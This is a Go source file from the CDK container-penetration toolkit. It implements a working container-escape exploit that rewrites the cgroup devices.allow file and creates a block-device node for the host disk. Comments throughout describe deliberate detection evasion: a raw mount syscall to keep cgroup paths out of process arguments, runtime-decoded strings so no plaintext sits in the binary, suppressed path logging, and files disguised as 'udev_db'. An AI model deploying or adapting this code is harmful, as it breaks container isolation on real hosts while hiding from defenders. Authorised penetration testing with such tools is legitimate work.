//go:build linux && !no_cgroup_devices_boundary
// +build linux,!no_cgroup_devices_boundary

/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package escaping

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"syscall"

	"github.com/cdk-team/CDK/pkg/audit/base"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/util"
)

// plugin interface
type cgroupDevicesExploitS struct{ base.BaseExploit }

var deviceCGroupPath = ""

func (p cgroupDevicesExploitS) Desc() string {
	return "escape sys_admin capabilities container via rewrite cgroup devices.allow. usage: ./cdk run cgroup-devices-boundary."
}

func fileInode(path string) (inodeID uint64, err error) {
	info, err := os.Stat(path)
	if err != nil {
		return 0, err
	}
	if stat, ok := info.Sys().(*syscall.Stat_t); ok {
		return stat.Ino, nil
	}
	return 0, nil
}

// newDevicesCgroup mounts the devices cgroup subsystem into a fresh tmp dir.
// Replaces the previous `exec.Command("mount", "-t", "cgroup", "-o", "devices", ...)`
// call with a pure syscall.Mount() so that "/sys/fs/cgroup" and related strings
// never appear in the execve argv vector.
func newDevicesCgroup(filePreString string) error {

	// mkdir
	var taskRandString = util.RandString(6)
	deviceCGroupPath = fmt.Sprintf("/tmp/%s_%s", filePreString, taskRandString)
	if err := os.Mkdir(deviceCGroupPath, os.ModePerm); err != nil {
		return err
	}

	// pure syscall mount — no external process, no argv to inspect.
	if err := syscall.Mount("devices", deviceCGroupPath, "cgroup", 0, "devices"); err != nil {
		return fmt.Errorf("mount devices cgroup: %w", err)
	}
	return nil
}

func findCurrentCgroupENV() string {

	devicesAllowPath := ""
	var rootDeviceAllow = fmt.Sprintf("%s/devices.allow", deviceCGroupPath)

	// current container devices.allow path is decoded at runtime (no plaintext in .rodata)
	curAllow := util.CgroupDevicesAllow()

	// find current container cgroup
	inodeID, err := fileInode(curAllow)
	if err != nil {
		// do NOT log the literal path; log only the symptom.
		log.Printf("cannot retrieve inode of container devices control file: %s\n", err)
		return ""
	}
	log.Printf("inode id of current container devices control: %d\n", inodeID)

	// the best way to find container id and current cgroup devices.allow
	err = filepath.Walk(deviceCGroupPath, func(path string, info os.FileInfo, err error) error {
		if err == nil && info.Name() == "devices.allow" && path != rootDeviceAllow {
			iid, err := fileInode(path)
			if err == nil && iid == inodeID {
				devicesAllowPath = path
				return nil
			}
		}
		return nil
	})

	return devicesAllowPath

}

func (p cgroupDevicesExploitS) Run() bool {

	// mkdir and mount
	err := newDevicesCgroup("udev_db")
	if err != nil {
		log.Printf("mount devices subsystem into tmpdir failed: %s\n", err)
		return false
	}

	devicesAllowPath := findCurrentCgroupENV()
	if devicesAllowPath == "" {
		log.Printf("writeable cgroup devices.allow not found")
		return false
	}
	log.Printf("matching devices.allow located at inode match\n")

	// get "virtblk" device ID
	mountInfos, err := util.GetMountInfo()
	if err != nil {
		log.Printf("get mount info error: %v", err)
		return false
	}

	// rewrite and mknod
	err = util.SetBlockAccessible(devicesAllowPath)
	if err != nil {
		log.Printf("set block accessible err %v", err)
		return false
	}

	// use lxcfs_rw exp function by https://github.com/yeahx
	for _, mi := range mountInfos {
		if util.FindTargetDeviceID(&mi) {

			dev := util.MakeDev(mi.Major, mi.Minor)
			if dev == 0 {
				log.Printf("Blockdevice Marjor/Minor number invalid.")
				return false
			}

			resultName := "./.udev_db_" + util.RandString(6)
			err = syscall.Mknod(resultName, syscall.S_IFBLK|uint32(os.FileMode(0700)), dev)
			if err != nil {
				log.Printf("mknod err: %v", err)
				return false
			} else {
				// escape done~
				log.Println(runtimeBlockDeviceBrowseHint(mi.Fstype, resultName))
				return true
			}
		}
	}

	return false
}

func init() {
	exploit := cgroupDevicesExploitS{}
	exploit.ExploitType = "escaping"
	exploit.ActivePrereqs = []string{"InContainer", "HasCgroupV1", "HasCapSysAdmin", "HasCapMknod"}
	plugin.RegisterExploit("cgroup-devices-boundary", exploit)
}
